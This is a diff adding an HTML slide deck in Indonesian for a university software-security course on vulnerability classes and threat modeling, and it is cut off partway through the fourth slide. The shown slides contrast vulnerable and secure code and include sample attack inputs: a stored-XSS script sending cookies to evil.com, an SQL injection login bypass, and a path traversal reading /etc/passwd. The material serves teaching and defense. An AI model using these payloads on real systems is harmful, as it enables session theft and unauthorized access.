@@ -1,0 +1,1378 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pertemuan 2 – Kerawanan PL & Model Ancaman | RKS222 PSSN</title>
+<style>
+  :root {
+    --blue:#0d2b6b; --darkblue:#081a45; --gold:#e8a020; --lightgold:#ffd166;
+    --red:#c0392b; --bg:#f0f4f8; --white:#ffffff; --shadow:0 4px 20px rgba(0,0,0,.12);
+    --radius:12px; --green:#27ae60; --orange:#e67e22; --purple:#8e44ad;
+    --teal:#16a085; --danger:#e74c3c;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'Segoe UI',sans-serif;background:var(--bg);overflow:hidden;height:100vh;width:100vw}
+  #ss{width:100%;height:100vh;position:relative}
+  .slide{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;opacity:0;pointer-events:none;transition:opacity .4s;overflow-y:auto}
+  .slide.active{opacity:1;pointer-events:all}
+
+  /* NAV */
+  #nav{position:fixed;bottom:0;left:0;right:0;z-index:999;background:var(--darkblue);display:flex;align-items:center;justify-content:space-between;padding:9px 22px;gap:10px;box-shadow:0 -2px 10px rgba(0,0,0,.3)}
+  .nb{background:var(--gold);color:var(--darkblue);border:none;border-radius:8px;padding:8px 20px;font-weight:700;font-size:13px;cursor:pointer;transition:.2s}
+  .nb:hover{background:var(--lightgold)}
+  .nb:disabled{background:#555;color:#888;cursor:not-allowed}
+  #pb{flex:1;height:5px;background:#333;border-radius:3px;overflow:hidden}
+  #pf{height:100%;background:var(--gold);border-radius:3px;transition:width .4s}
+  #sc{color:#aaa;font-size:12px;min-width:70px;text-align:center}
+  #stb{color:#ccc;font-size:12px;flex:1.5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+  /* COMMON */
+  .sh{background:var(--blue);padding:24px 44px 18px;color:#fff;flex-shrink:0}
+  .sh h2{font-size:21px;font-weight:800;margin-bottom:3px}
+  .sh p{font-size:13px;color:rgba(255,255,255,.7)}
+  .sb{padding:22px 44px 90px;flex:1}
+  .lbl{display:inline-block;background:var(--gold);color:var(--darkblue);font-weight:800;font-size:11px;letter-spacing:1.5px;padding:3px 11px;border-radius:20px;text-transform:uppercase;margin-bottom:10px}
+  .card{background:#fff;border-radius:var(--radius);padding:18px 20px;box-shadow:var(--shadow)}
+  .two{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+  .three{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+  .mt12{margin-top:12px} .mt16{margin-top:16px} .mt20{margin-top:20px}
+  h3.sec{font-size:13px;font-weight:700;color:var(--blue);margin-bottom:10px;text-transform:uppercase;letter-spacing:.8px;border-bottom:2px solid var(--gold);padding-bottom:5px}
+  ul.dot{padding-left:18px} ul.dot li{font-size:13px;line-height:1.8;color:#444}
+  .badge{display:inline-block;padding:2px 9px;border-radius:12px;font-size:11px;font-weight:700}
+  .b-red{background:#fde;color:#c0392b} .b-blue{background:#e8f0fe;color:#1565c0}
+  .b-green{background:#e8f5e9;color:#2e7d32} .b-orange{background:#fff3e0;color:#e65100}
+  .b-purple{background:#f3e5f5;color:#6a1b9a} .b-gray{background:#f0f4f8;color:#555}
+
+  /* COVER */
+  #s0{background:linear-gradient(135deg,var(--darkblue) 0%,#1a3a8f 55%,#6a1b9a 100%);justify-content:center;align-items:center;text-align:center;padding:36px;position:relative}
+  #s0::before{content:'';position:absolute;inset:0;background:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/svg%3E")}
+  .cv-badge{background:rgba(232,160,32,.2);border:1px solid var(--gold);color:var(--gold);border-radius:20px;padding:5px 16px;font-size:13px;font-weight:600;letter-spacing:1px;margin-bottom:20px;display:inline-block}
+  .cv-title{color:#fff;font-size:36px;font-weight:900;line-height:1.2;margin-bottom:8px}
+  .cv-sub{color:var(--lightgold);font-size:19px;font-weight:600;margin-bottom:6px}
+  .cv-meta{color:rgba(255,255,255,.6);font-size:13px;margin-bottom:28px}
+  .cv-div{width:70px;height:3px;background:var(--gold);border-radius:2px;margin:18px auto}
+  .cv-pills{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+  .cv-pill{background:rgba(255,255,255,.1);color:#fff;border:1px solid rgba(255,255,255,.2);border-radius:8px;padding:7px 14px;font-size:12.5px}
+  .cv-pill strong{color:var(--gold)}
+
+  /* KERAWANAN CARDS */
+  .vtype{border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow)}
+  .vt-head{padding:12px 16px;color:#fff;display:flex;gap:10px;align-items:center}
+  .vt-head .icon{font-size:24px}
+  .vt-head h4{font-size:14px;font-weight:800}
+  .vt-head .cvss{font-size:11px;opacity:.85}
+  .vt-body{background:#fff;padding:13px 16px}
+  .vt-body p{font-size:12.5px;color:#444;line-height:1.6;margin-bottom:7px}
+  .vt-body .code{background:#1e1e2e;color:#cdd6f4;border-radius:6px;padding:9px 12px;font-family:monospace;font-size:11.5px;line-height:1.7;margin:7px 0}
+  .vt-body .code .bad{color:#f38ba8}
+  .vt-body .code .good{color:#a6e3a1}
+  .vt-body .code .comment{color:#6c7086}
+  .vtype .mit{background:#e8f5e9;border-left:3px solid var(--green);padding:7px 12px;margin-top:7px;font-size:11.5px;color:#2e7d32;border-radius:0 6px 6px 0}
+
+  .vh1 .vt-head{background:linear-gradient(135deg,#c62828,#e53935)}
+  .vh2 .vt-head{background:linear-gradient(135deg,#1565c0,#1976d2)}
+  .vh3 .vt-head{background:linear-gradient(135deg,#e65100,#f57c00)}
+  .vh4 .vt-head{background:linear-gradient(135deg,#6a1b9a,#8e24aa)}
+  .vh5 .vt-head{background:linear-gradient(135deg,#00695c,#00897b)}
+  .vh6 .vt-head{background:linear-gradient(135deg,#37474f,#546e7a)}
+
+  /* STRIDE */
+  .stride-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+  .stride-card{border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow)}
+  .stride-head{padding:14px 16px;color:#fff;text-align:center}
+  .stride-head .big{font-size:42px;font-weight:900;opacity:.25;line-height:1}
+  .stride-head h3{font-size:16px;font-weight:800;margin-top:-10px}
+  .stride-head .full{font-size:12px;opacity:.85;margin-top:2px}
+  .stride-body{background:#fff;padding:13px 16px}
+  .stride-body .def{font-size:12.5px;color:#444;line-height:1.6;margin-bottom:8px}
+  .stride-body .example{background:#f8f9fa;border-radius:6px;padding:8px 12px;font-size:12px;color:#555;margin-bottom:6px}
+  .stride-body .example strong{color:var(--blue)}
+  .stride-body .ctrl{font-size:11.5px;color:var(--green);font-weight:600}
+  .ss{background:linear-gradient(135deg,#1565c0,#1e88e5)}
+  .st{background:linear-gradient(135deg,#c62828,#ef5350)}
+  .sr{background:linear-gradient(135deg,#37474f,#546e7a)}
+  .si{background:linear-gradient(135deg,#e65100,#ff7043)}
+  .sd{background:linear-gradient(135deg,#2e7d32,#43a047)}
+  .se{background:linear-gradient(135deg,#6a1b9a,#ab47bc)}
+
+  /* DFD DEMO */
+  .dfd-wrap{background:var(--darkblue);border-radius:var(--radius);padding:20px;box-shadow:var(--shadow)}
+  .dfd-title{color:var(--gold);font-size:13px;font-weight:700;margin-bottom:14px;text-align:center;text-transform:uppercase;letter-spacing:1px}
+  .dfd-row{display:flex;align-items:center;justify-content:center;gap:6px;flex-wrap:wrap;margin-bottom:10px}
+  .dfd-node{border-radius:8px;padding:10px 14px;text-align:center;min-width:90px}
+  .dfd-node .nn{font-size:20px;margin-bottom:4px}
+  .dfd-node .nl{font-size:11px;font-weight:700;color:#fff}
+  .dfd-ext{background:rgba(255,255,255,.1);border:2px solid rgba(255,255,255,.3)}
+  .dfd-proc{background:rgba(232,160,32,.2);border:2px solid var(--gold)}
+  .dfd-db{background:rgba(39,174,96,.15);border:2px solid #27ae60}
+  .dfd-arrow{font-size:20px;color:rgba(255,255,255,.5)}
+  .dfd-flow-label{font-size:10px;color:rgba(255,255,255,.6);text-align:center;margin-top:2px}
+  .tb-line{width:100%;height:2px;background:rgba(255,80,80,.5);margin:8px 0;position:relative}
+  .tb-line::before{content:'🔴 Trust Boundary';position:absolute;left:50%;transform:translateX(-50%);top:-8px;font-size:10px;color:rgba(255,100,100,.9);white-space:nowrap;background:var(--darkblue);padding:0 6px}
+
+  /* THREAT TABLE */
+  .threat-table{width:100%;border-collapse:collapse;font-size:12.5px}
+  .threat-table th{background:var(--blue);color:#fff;padding:9px 12px;text-align:left;font-size:11.5px}
+  .threat-table td{padding:8px 12px;border-bottom:1px solid #eee;vertical-align:top}
+  .threat-table tr:nth-child(even) td{background:#f8f9fa}
+  .threat-table .sev-h{background:#fde;color:#c0392b;padding:2px 8px;border-radius:10px;font-weight:700;font-size:11px}
+  .threat-table .sev-m{background:#fff3e0;color:#e65100;padding:2px 8px;border-radius:10px;font-weight:700;font-size:11px}
+  .threat-table .sev-l{background:#e8f5e9;color:#2e7d32;padding:2px 8px;border-radius:10px;font-weight:700;font-size:11px}
+
+  /* DREAD */
+  .dread-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:16px}
+  .dread-card{border-radius:var(--radius);padding:14px 10px;text-align:center;color:#fff;box-shadow:var(--shadow)}
+  .dread-card .dl{font-size:28px;font-weight:900;opacity:.25}
+  .dread-card h4{font-size:13px;font-weight:800;margin-top:-8px;margin-bottom:5px}
+  .dread-card p{font-size:11px;opacity:.9;line-height:1.5}
+  .dc1{background:linear-gradient(135deg,#c62828,#e53935)}
+  .dc2{background:linear-gradient(135deg,#e65100,#f57c00)}
+  .dc3{background:linear-gradient(135deg,#1565c0,#1976d2)}
+  .dc4{background:linear-gradient(135deg,#2e7d32,#43a047)}
+  .dc5{background:linear-gradient(135deg,#6a1b9a,#8e24aa)}
+
+  .dread-calc{background:var(--darkblue);border-radius:var(--radius);padding:16px 20px;color:#fff}
+  .dread-calc h3{color:var(--gold);font-size:13px;font-weight:700;margin-bottom:12px}
+  .dread-example{display:grid;grid-template-columns:2fr 1fr 1fr 1fr 1fr 1fr 1fr;gap:6px;font-size:12px;margin-bottom:8px;align-items:center}
+  .dread-example .th{color:rgba(255,255,255,.5);font-size:11px}
+  .dread-example .sc{background:rgba(255,255,255,.1);border-radius:6px;padding:4px 8px;text-align:center;font-weight:700}
+  .dread-example .total{background:var(--gold);color:var(--darkblue);border-radius:6px;padding:4px 8px;text-align:center;font-weight:800}
+
+  /* PROCESS STEPS */
+  .steps{display:flex;gap:0;flex-direction:column}
+  .step{display:flex;gap:14px;margin-bottom:0}
+  .step-num-wrap{display:flex;flex-direction:column;align-items:center}
+  .step-num{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:15px;color:#fff;flex-shrink:0}
+  .step-line{width:2px;flex:1;min-height:16px;background:#e0e0e0;margin:2px 0}
+  .step-body{flex:1;padding-bottom:16px}
+  .step-body h4{font-size:14px;font-weight:700;margin-bottom:5px}
+  .step-body p{font-size:13px;color:#555;line-height:1.6}
+  .step-body ul{padding-left:16px;margin-top:5px}
+  .step-body li{font-size:12.5px;color:#555;line-height:1.8}
+
+  /* SUMMARY */
+  .sum-row{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+  .sum-c{border-radius:var(--radius);padding:18px 14px;color:#fff;text-align:center;box-shadow:var(--shadow)}
+  .sum-c .sicon{font-size:28px;margin-bottom:8px}
+  .sum-c h3{font-size:13px;font-weight:800;color:var(--lightgold);margin-bottom:7px}
+  .sum-c ul{list-style:none;font-size:11.5px;line-height:1.9;text-align:left}
+  .sum-c ul li::before{content:'✓ ';color:var(--lightgold)}
+  .sc1{background:linear-gradient(160deg,#0d47a1,#1565c0)}
+  .sc2{background:linear-gradient(160deg,#b71c1c,#c62828)}
+  .sc3{background:linear-gradient(160deg,#4a148c,#6a1b9a)}
+  .sc4{background:linear-gradient(160deg,#1b5e20,#2e7d32)}
+
+  /* TUGAS */
+  .tug-hdr{background:linear-gradient(135deg,#4a148c,#7b1fa2);color:#fff;border-radius:var(--radius);padding:16px 22px;margin-bottom:16px;display:flex;gap:14px;align-items:center;box-shadow:var(--shadow)}
+  .tug-hdr h2{font-size:19px;font-weight:800;margin-bottom:3px}
+  .tug-hdr p{font-size:13px;opacity:.9}
+  .tug-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  .tug-card{background:#fff;border-radius:var(--radius);padding:16px 18px;box-shadow:var(--shadow);border-top:4px solid}
+  .tug-card:nth-child(1){border-color:#1565c0}
+  .tug-card:nth-child(2){border-color:#c62828}
+  .tug-card:nth-child(3){border-color:#6a1b9a;grid-column:1/-1}
+  .tug-card h3{font-size:14px;font-weight:800;margin-bottom:8px}
+  .tug-card p,.tug-card li{font-size:13px;color:#444;line-height:1.7}
+  .tug-card ul{padding-left:16px;margin-top:5px}
+  .info-chips{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}
+  .ic{background:#f0f4f8;border-radius:6px;padding:4px 11px;font-size:12px;color:#555}
+  .ic strong{color:var(--blue)}
+  .rubrik{width:100%;border-collapse:collapse;margin-top:10px;font-size:12.5px}
+  .rubrik th{background:var(--blue);color:#fff;padding:8px 11px;text-align:left}
+  .rubrik td{padding:7px 11px;border-bottom:1px solid #eee}
+  .rubrik tr:nth-child(even) td{background:#f8f9fa}
+
+  /* QUIZ */
+  .qcard{background:#fff;border-radius:var(--radius);padding:16px 20px;box-shadow:var(--shadow);border-left:4px solid var(--blue);margin-bottom:14px}
+  .qcard .qno{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:#888;margin-bottom:5px}
+  .qcard p{font-size:14px;font-weight:600;color:#333;margin-bottom:10px}
+  .qopts{display:flex;flex-direction:column;gap:7px}
+  .qopt{padding:8px 13px;border-radius:8px;border:2px solid #e0e0e0;cursor:pointer;font-size:13px;transition:.2s;background:#fff;text-align:left}
+  .qopt:hover{border-color:var(--blue);background:#e8f0fe}
+  .qopt.correct{background:#e8f5e9;border-color:var(--green);color:var(--green);font-weight:700}
+  .qopt.wrong{background:#fce4ec;border-color:var(--danger);color:var(--danger)}
+
+  /* REF */
+  .ref-item{background:#fff;border-radius:8px;padding:11px 15px;box-shadow:var(--shadow);font-size:13px;color:#333;display:flex;gap:10px;align-items:flex-start;border-left:3px solid;line-height:1.5;margin-bottom:9px}
+  .rnum{font-weight:800;font-size:14px;flex-shrink:0;width:20px}
+  .ryear{background:var(--gold);color:var(--darkblue);font-size:10px;font-weight:700;padding:1px 6px;border-radius:4px;flex-shrink:0;margin-top:2px}
+</style>
+</head>
+<body>
+<div id="ss">
+
+<!-- ═══ SLIDE 0 – COVER ═══ -->
+<div class="slide active" id="s0" data-title="Cover">
+  <div class="cv-badge">📘 RKS222 · Keamanan Perangkat Lunak · Semester IV · Minggu 2</div>
+  <div class="cv-title">Kerawanan Perangkat Lunak<br>&amp; Model Ancaman</div>
+  <div class="cv-sub">Sub-CPMK 261.1 — Pertemuan 2</div>
+  <div class="cv-div"></div>
+  <div class="cv-meta">Politeknik Siber Dan Sandi Negara · Program Studi Rekayasa Keamanan Siber</div>
+  <div class="cv-pills">
+    <div class="cv-pill">⏱️ <strong>3 × 50 menit</strong></div>
+    <div class="cv-pill">📊 Bobot <strong>3%</strong></div>
+    <div class="cv-pill">🎯 Metode: Simulasi &amp; Diskusi</div>
+    <div class="cv-pill">✏️ Tes: Kuis + Presentasi</div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 1 – CAPAIAN ═══ -->
+<div class="slide" id="s1" data-title="Capaian Pembelajaran">
+  <div class="sh">
+    <div class="lbl">Overview</div>
+    <h2>Capaian Pembelajaran Pertemuan 2</h2>
+    <p>Sub-CPMK 261.1 | CPMK261 | CPL02 — RKS222, PSSN</p>
+  </div>
+  <div class="sb">
+    <div class="card" style="border-left:5px solid var(--blue);margin-bottom:16px">
+      <div style="font-size:12px;text-transform:uppercase;letter-spacing:1px;color:#888;margin-bottom:6px">Sub-CPMK 261.1</div>
+      <p style="font-size:15px;font-weight:700;color:var(--blue)">Mahasiswa mampu menjelaskan <strong>jenis perangkat lunak, ancaman dan kerawanan</strong> pada berbagai jenis perangkat lunak</p>
+    </div>
+    <div class="lbl">2 Indikator Pertemuan Ini</div>
+    <div class="two">
+      <div class="card" style="border-top:4px solid var(--danger)">
+        <div style="font-size:22px;margin-bottom:8px">🕳️</div>
+        <h3 style="font-size:15px;font-weight:800;color:var(--danger);margin-bottom:8px">Indikator 1</h3>
+        <p style="font-size:14px;font-weight:600;color:#333;margin-bottom:10px">Ketepatan menjelaskan berbagai <strong>jenis kerawanan dan serangan</strong> terhadap perangkat lunak</p>
+        <ul class="dot">
+          <li>Klasifikasi kerawanan (Memory, Injection, Auth, Logic)</li>
+          <li>Pemetaan ke CWE / OWASP Top 10 Web 2025 &amp; Mobile 2024</li>
+          <li>Contoh kode nyata vulnerable vs. secure</li>
+          <li>Insiden CVE terkini sebagai konteks</li>
+        </ul>
+      </div>
+      <div class="card" style="border-top:4px solid var(--purple)">
+        <div style="font-size:22px;margin-bottom:8px">🗺️</div>
+        <h3 style="font-size:15px;font-weight:800;color:var(--purple);margin-bottom:8px">Indikator 2</h3>
+        <p style="font-size:14px;font-weight:600;color:#333;margin-bottom:10px">Mampu <strong>mendemonstrasikan penyusunan model ancaman</strong></p>
+        <ul class="dot">
+          <li>Framework STRIDE (Microsoft Threat Modeling)</li>
+          <li>DREAD scoring untuk prioritas risiko</li>
+          <li>Data Flow Diagram (DFD) + Trust Boundaries</li>
+          <li>Demo: Threat modeling sistem login web</li>
+        </ul>
+      </div>
+    </div>
+    <div class="card mt16" style="background:var(--darkblue);color:#fff;display:flex;gap:20px;align-items:center;flex-wrap:wrap">
+      <div style="font-size:13px"><span style="color:var(--gold);font-weight:700">Pustaka:</span> Bulmash &amp; Segura (2024) · Khan et al. (2003) · OWASP Top 10 Web 2025 · OWASP Mobile Top 10 2024</div>
+      <div style="display:flex;gap:10px;flex-wrap:wrap">
+        <span class="badge b-orange">Diskusi &amp; Observasi</span>
+        <span class="badge b-purple">Kuis + Presentasi</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 2 – KLASIFIKASI KERAWANAN ═══ -->
+<div class="slide" id="s2" data-title="Klasifikasi Kerawanan PL">
+  <div class="sh">
+    <div class="lbl">Indikator 1</div>
+    <h2>Klasifikasi Kerawanan Perangkat Lunak</h2>
+    <p>Peta besar jenis-jenis kerawanan berdasarkan CWE, OWASP Top 10 Web 2025, OWASP Mobile 2024, dan penelitian terkini</p>
+  </div>
+  <div class="sb">
+    <div class="card" style="background:linear-gradient(135deg,var(--darkblue),#1a3a8f);color:#fff;margin-bottom:16px">
+      <p style="font-size:14px;line-height:1.7"><strong style="color:var(--lightgold)">Kerawanan (Vulnerability)</strong> adalah kelemahan dalam desain, implementasi, konfigurasi, atau operasional perangkat lunak yang dapat dieksploitasi oleh ancaman untuk menyebabkan kerugian. Menurut <strong style="color:var(--lightgold)">NIST SP 800-30 Rev.1</strong>, kerawanan dikategorikan berdasarkan sumbernya: desain yang buruk, kode yang cacat, atau konfigurasi yang tidak tepat.</p>
+    </div>
+    <div class="three">
+      <div class="card" style="border-top:4px solid var(--danger)">
+        <h3 class="sec" style="color:var(--danger)">🧠 Memory Safety</h3>
+        <ul class="dot">
+          <li><strong>Buffer Overflow</strong> — CWE-121/122</li>
+          <li><strong>Heap Overflow</strong> — CWE-122</li>
+          <li><strong>Use-After-Free</strong> — CWE-416</li>
+          <li><strong>Integer Overflow</strong> — CWE-190</li>
+          <li><strong>Format String Bug</strong> — CWE-134</li>
+          <li><strong>NULL Pointer Deref</strong> — CWE-476</li>
+        </ul>
+        <div class="badge b-red mt12">C/C++/Assembly rawan</div>
+      </div>
+      <div class="card" style="border-top:4px solid var(--blue)">
+        <h3 class="sec" style="color:var(--blue)">💉 Injection</h3>
+        <ul class="dot">
+          <li><strong>SQL Injection</strong> — CWE-89 (A05 OWASP Web 2025, M4 Mobile)</li>
+          <li><strong>OS Command Injection</strong> — CWE-78</li>
+          <li><strong>Cross-Site Scripting (XSS)</strong> — CWE-79</li>
+          <li><strong>XML/XXE Injection</strong> — CWE-611</li>
+          <li><strong>LDAP Injection</strong> — CWE-90</li>
+          <li><strong>Template Injection (SSTI)</strong> — CWE-94</li>
+        </ul>
+        <div class="badge b-blue mt12">Web app paling sering</div>
+      </div>
+      <div class="card" style="border-top:4px solid var(--orange)">
+        <h3 class="sec" style="color:var(--orange)">🔐 Auth &amp; Access</h3>
+        <ul class="dot">
+          <li><strong>Broken Authentication</strong> — CWE-287</li>
+          <li><strong>IDOR</strong> — CWE-639 (A01 OWASP Web 2025 — tetap #1, M3 Mobile)</li>
+          <li><strong>Privilege Escalation</strong> — CWE-269</li>
+          <li><strong>Path Traversal</strong> — CWE-22</li>
+          <li><strong>CSRF</strong> — CWE-352</li>
+          <li><strong>SSRF</strong> — CWE-918</li>
+        </ul>
+        <div class="badge b-orange mt12">Paling berdampak bisnis</div>
+      </div>
+      <div class="card" style="border-top:4px solid var(--purple)">
+        <h3 class="sec" style="color:var(--purple)">🔑 Kriptografi Lemah</h3>
+        <ul class="dot">
+          <li><strong>Algoritma lemah</strong> (MD5, DES, RC4)</li>
+          <li><strong>Hardcoded credentials</strong> — CWE-798</li>
+          <li><strong>Weak random number</strong> — CWE-338</li>
+          <li><strong>Insufficient key length</strong></li>
+          <li><strong>Improper cert validation</strong> — CWE-295</li>
+        </ul>
+        <div class="badge b-purple mt12">A04 OWASP Web 2025 · M10 Mobile 2024</div>
+      </div>
+      <div class="card" style="border-top:4px solid var(--teal)">
+        <h3 class="sec" style="color:var(--teal)">⚙️ Desain &amp; Konfigurasi</h3>
+        <ul class="dot">
+          <li><strong>Security Misconfiguration</strong> (A02 OWASP Web 2025 ↑, M8 Mobile)</li>
+          <li><strong>Insecure defaults</strong></li>
+          <li><strong>Missing security headers</strong></li>
+          <li><strong>Verbose error messages</strong> — CWE-209</li>
+          <li><strong>Insecure design</strong> (A06 OWASP Web 2025)</li>
+        </ul>
+        <div class="badge b-green mt12">Mudah dicegah, sering terjadi</div>
+      </div>
+      <div class="card" style="border-top:4px solid var(--danger)" >
+        <h3 class="sec" style="color:var(--danger)">⛓️ Supply Chain</h3>
+        <ul class="dot">
+          <li><strong>Dependency confusion</strong></li>
+          <li><strong>Typosquatting packages</strong></li>
+          <li><strong>Malicious updates</strong></li>
+          <li><strong>Backdoor insertion</strong></li>
+          <li><strong>Compromised CI/CD</strong></li>
+        </ul>
+        <div class="badge b-red mt12">Log4Shell, XZ Utils 2024</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 3 – MEMORY & INJECTION DETAIL ═══ -->
+<div class="slide" id="s3" data-title="Memory Safety & Injection — Contoh Kode">
+  <div class="sh">
+    <div class="lbl">Indikator 1 — Detail</div>
+    <h2>Memory Safety &amp; Injection — Contoh Kode Nyata</h2>
+    <p>Memahami kerawanan melalui perbandingan kode vulnerable vs. secure</p>
+  </div>
+  <div class="sb">
+    <div class="two">
+      <div class="vtype vh1">
+        <div class="vt-head"><div class="icon">💾</div><div><h4>Buffer Overflow (CWE-121)</h4><div class="cvss">CVSS: 9.8 Critical · C/C++</div></div></div>
+        <div class="vt-body">
+          <p>Terjadi saat program menulis data melebihi batas buffer yang dialokasikan di stack. Penyerang dapat menimpa return address untuk mengeksekusi kode arbitrer.</p>
+          <div class="code"><span class="bad">// ❌ VULNERABLE — strcpy tidak cek panjang</span>
+void login(char *input) {
+    char buf[64];
+    <span class="bad">strcpy(buf, input);</span>  <span class="comment">// buffer overflow!</span>
+}
+<span class="good">// ✅ SECURE — batasi panjang input</span>
+void login(char *input) {
+    char buf[64];
+    <span class="good">strncpy(buf, input, sizeof(buf)-1);</span>
+    <span class="good">buf[sizeof(buf)-1] = '\0';</span>
+}</div>
+          <div class="mit">🛡️ Mitigasi: gunakan fungsi safe (strncpy, snprintf), aktifkan stack canaries, ASLR, DEP/NX bit</div>
+        </div>
+      </div>
+      <div class="vtype vh2">
+        <div class="vt-head"><div class="icon">💉</div><div><h4>SQL Injection (CWE-89)</h4><div class="cvss">CVSS: 9.8 Critical · Web App</div></div></div>
+        <div class="vt-body">
+          <p>Input pengguna dimasukkan langsung ke query SQL tanpa sanitasi. Penyerang dapat bypass auth, dump database, atau menghapus data.</p>
+          <div class="code"><span class="bad">// ❌ VULNERABLE</span>
+$q = "SELECT * FROM users
+  WHERE user='<span class="bad">$_POST['user']</span>'
+  AND pass='$_POST['pass']'";
+<span class="comment">// Payload: user = admin' --</span>
+<span class="good">// ✅ SECURE — Prepared Statement</span>
+$stmt = $pdo->prepare(
+  "SELECT * FROM users
+   WHERE user=? AND pass=?");
+<span class="good">$stmt->execute([$user, $pass]);</span></div>
+          <div class="mit">🛡️ Mitigasi: prepared statements, parameterized queries, ORM, input validation, least privilege DB user</div>
+        </div>
+      </div>
+      <div class="vtype vh3">
+        <div class="vt-head"><div class="icon">📜</div><div><h4>Stored XSS (CWE-79)</h4><div class="cvss">CVSS: 8.8 High · Web App</div></div></div>
+        <div class="vt-body">
+          <p>Script berbahaya disimpan di server dan dieksekusi di browser korban. Dapat mencuri cookie sesi, redirect ke phishing, atau keylogging.</p>
+          <div class="code"><span class="bad">// ❌ VULNERABLE — output langsung</span>
+echo "Komentar: " . <span class="bad">$_POST['comment']</span>;
+<span class="comment">// Payload: &lt;script&gt;document.location=
+//  'https://evil.com?c='+document.cookie&lt;/script&gt;</span>
+<span class="good">// ✅ SECURE — encode output</span>
+echo "Komentar: " . <span class="good">htmlspecialchars(
+  $_POST['comment'], ENT_QUOTES, 'UTF-8');</span></div>
+          <div class="mit">🛡️ Mitigasi: output encoding (htmlspecialchars), Content Security Policy (CSP), HttpOnly cookie</div>
+        </div>
+      </div>
+      <div class="vtype vh4">
+        <div class="vt-head"><div class="icon">🛣️</div><div><h4>Path Traversal (CWE-22)</h4><div class="cvss">CVSS: 7.5 High · File System</div></div></div>
+        <div class="vt-body">
+          <p>Penyerang memanipulasi path file dengan urutan "../" untuk mengakses file di luar direktori yang diizinkan, termasuk /etc/passwd atau file konfigurasi.</p>
+          <div class="code"><span class="bad">// ❌ VULNERABLE</span>
+$file = $_GET['file'];
+<span class="bad">include("/var/www/files/" . $file);</span>
+<span class="comment">// Attack: ?file=../../etc/passwd</span>
+<span class="good">// ✅ SECURE — validasi & canonicalize</span>
+$file = basename($_GET['file']);
+$path = realpath("/var/www/files/".$file);
+<span class="good">if(strpos($path,"/var/www/files/")===0){
+  include($path); }</span></div>
+          <div class="mit">🛡️ Mitigasi: realpath() validation, basename(), allowlist file names, chroot jail</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 4 – AUTH, IDOR, CRYPTO ═══ -->
+<div class="slide" id="s4" data-title="Auth Failure, IDOR & Cryptographic Weakness">
+  <div class="sh">
+    <div class="lbl">Indikator 1 — Lanjutan</div>
+    <h2>Authentication Failure, IDOR &amp; Kelemahan Kriptografi</h2>
+    <p>Kerawanan utama berdasarkan OWASP Top 10 Web 2025 &amp; Mobile 2024 yang berdampak langsung pada kerahasiaan data</p>
+  </div>
+  <div class="sb">
+    <div class="three">
+      <div class="vtype vh2" style="grid-column:span 1">
+        <div class="vt-head"><div class="icon">🔑</div><div><h4>Broken Authentication</h4><div class="cvss">OWASP A07:2025 Web · M3:2024 Mobile</div></div></div>
+        <div class="vt-body">
+          <p>Kelemahan pada mekanisme autentikasi yang memungkinkan penyerang mengambil alih akun.</p>
+          <ul style="padding-left:15px;font-size:12.5px;color:#444;line-height:1.8">
+            <li>Password plaintext / MD5 tanpa salt</li>
+            <li>Tidak ada rate limiting → brute force</li>
+            <li>Session ID tidak diregenerasi setelah login</li>
+            <li>JWT dengan algoritma "none"</li>
+            <li>Default credentials tidak diganti</li>
+          </ul>
+          <div class="code" style="margin-top:8px"><span class="bad">// ❌ Simpan password dengan MD5</span>
+$hash = md5($password); <span class="comment">// BERBAHAYA!</span>
+<span class="good">// ✅ Gunakan password_hash()</span>
+$hash = password_hash($pass, PASSWORD_BCRYPT);</div>
+          <div class="mit">🛡️ password_hash/verify, MFA, rate limiting, session.regenerate_id()</div>
+        </div>
+      </div>
+      <div class="vtype vh5">
+        <div class="vt-head"><div class="icon">🔓</div><div><h4>IDOR / Broken Access Control</h4><div class="cvss">OWASP A01:2025 Web — tetap #1! · M3:2024 Mobile</div></div></div>
+        <div class="vt-body">
+          <p>Pengguna dapat mengakses resource milik pengguna lain hanya dengan mengubah identifier (ID, nomor rekening, filename).</p>
+          <ul style="padding-left:15px;font-size:12.5px;color:#444;line-height:1.8">
+            <li>Akses data user lain via URL manipulation</li>
+            <li>Modifikasi peran/role via parameter</li>
+            <li>Direct file access tanpa auth check</li>
+          </ul>
+          <div class="code"><span class="bad">// ❌ VULNERABLE — no ownership check</span>
+GET /api/orders/<span class="bad">1234</span>  → data user lain!
+<span class="good">// ✅ SECURE — verify ownership</span>
+if ($order->user_id !== $currentUser->id){
+  <span class="good">return 403; // Forbidden</span>
+}</div>
+          <div class="mit">🛡️ Verifikasi kepemilikan setiap request, gunakan indirect reference (UUID), server-side authorization</div>
+        </div>
+      </div>
+      <div class="vtype vh4">
